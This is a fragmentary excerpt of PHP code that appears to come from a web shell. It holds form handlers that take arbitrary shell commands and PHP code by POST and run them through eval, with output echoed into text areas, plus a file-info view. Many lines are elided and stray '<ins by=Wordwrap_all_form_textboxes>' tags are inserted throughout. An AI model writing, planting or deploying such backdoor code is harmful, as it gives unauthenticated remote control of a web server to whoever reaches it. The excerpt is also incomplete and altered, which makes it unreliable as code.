...
<br><br><b>Text:</b><br><ins by=Wordwrap_all_form_textboxes></ins><textarea name=\"search_text\" cols=\"122\" rows=\"10\" wrap=soft>".htmlspecialchars($search_text)."</textarea>
...
else
{
 ...
 if (!empty($submit))
 {
  ...
  if ($cmd_txt)
  {
   $rows = count(explode("\r\n",$ret))+1;
   if ($rows < 10) {$rows = 10;}
   echo "<br><ins by=Wordwrap_all_form_textboxes></ins><textarea cols=\"122\" rows=\"".$rows."\" readonly wrap=soft>".htmlspecialchars($ret)."</textarea>";
  }
  else {echo $ret."<br>";}
  @chdir($olddir);
 }
 else {echo "<b>Execution command</b>"; if (empty($cmd_txt)) {$cmd_txt = TRUE;}}
 echo "<form method=POST><input type=hidden name=act value=cmd><ins by=Wordwrap_all_form_textboxes></ins><textarea name=cmd cols=122 rows=10 wrap=soft>".htmlspecialchars($cmd)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit name=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"cmd_txt\" value=\"1\""; if ($cmd_txt) {echo " checked";} echo "></form>";
}
}
if ($act == "ls")
{
...
if ($act == "eval")
{
 if (!empty($eval))
 {
  ...
  else
  {
   if ($eval_txt)
   {
    echo "<br><ins by=Wordwrap_all_form_textboxes></ins><textarea cols=\"122\" rows=\"15\" readonly wrap=soft>";
    eval($eval);
    echo "</textarea>";
   }
   else {echo $ret;}
 ...
 echo "<form method=POST><input type=hidden name=act value=eval><ins by=Wordwrap_all_form_textboxes></ins><textarea name=\"eval\" cols=\"122\" rows=\"10\" wrap=soft>".htmlspecialchars($eval)."</textarea><input type=hidden name=\"d\" value=\"".$dispd."\"><br><br><input type=submit value=\"Execute\">&nbsp;Display in text-area&nbsp;<input type=\"checkbox\" name=\"eval_txt\" value=\"1\""; if ($eval_txt) {echo " checked";} echo "></form>";
}
if ($act == "f")
{
 ...
 else
 {
  ...
  if ($ft == "info")
  {
   ...
   if (!empty($encoded))
   {
    echo "<ins by=Wordwrap_all_form_textboxes></ins><textarea cols=80 rows=10 wrap=soft>".htmlspecialchars($encoded)."</textarea><br><br>";
   }
